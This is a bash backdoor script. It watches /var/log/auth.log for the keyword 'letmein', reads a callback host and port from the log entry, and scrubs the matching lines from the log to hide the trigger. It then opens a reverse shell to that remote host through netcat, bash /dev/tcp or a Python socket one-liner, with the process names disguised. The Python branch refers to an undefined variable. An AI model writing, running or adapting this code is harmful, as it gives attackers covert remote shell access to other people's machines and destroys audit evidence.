KEYWORD="letmein"
SLEEP_TIME=5
BASH_NAME="[NOT_BASH]"
PY_NAME="[NOT_PY]"

grepout() {
    grep -v $KEYWORD /var/log/auth.log > /tmp/.authbak
    cp /tmp/.authbak /var/log/auth.log
    rm /tmp/.authbak
}

snore()
{
    [[ -n "${_snore_fd:-}" ]] || exec {_snore_fd}<> <(:)
    read ${1:+-t "$1"} -u $_snore_fd || :
}

while true; do
if grep --quiet $KEYWORD /var/log/auth.log; then
    
    
    str=$(grep $KEYWORD /var/log/auth.log|tail -1)
    options=`echo $str|cut -d "-" -f 2`     
    
    grepout    
  
  run=$(echo $options | cut -d "_" -f 1)
   
    if [ "$run" = "nc" ]; then
        cb=$(echo $options | cut -d "_" -f 2)
        port=$(echo $options | cut -d "_" -f 3)
        (nc $cb $port -e /bin/bash >/dev/null 2>&1 &)  
    fi
    
    if [ "$run" = "bash" ]; then
        cb=$(echo $options | cut -d "_" -f 2)
        port=$(echo $options | cut -d "_" -f 3)
        (exec -a $BASH_NAME bash -i >& /dev/tcp/$cb/$port 0>&1 &) 
    fi
    
    if [ "$run" = "py" ]; then
        cb=$(echo $options | cut -d "_" -f 2)
        port=$(echo $options | cut -d "_" -f 3)
        (echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" | exec -a $PY_NAME python &)  
    fi

    

else
x=1
fi
snore $SLEEP_TIME
done
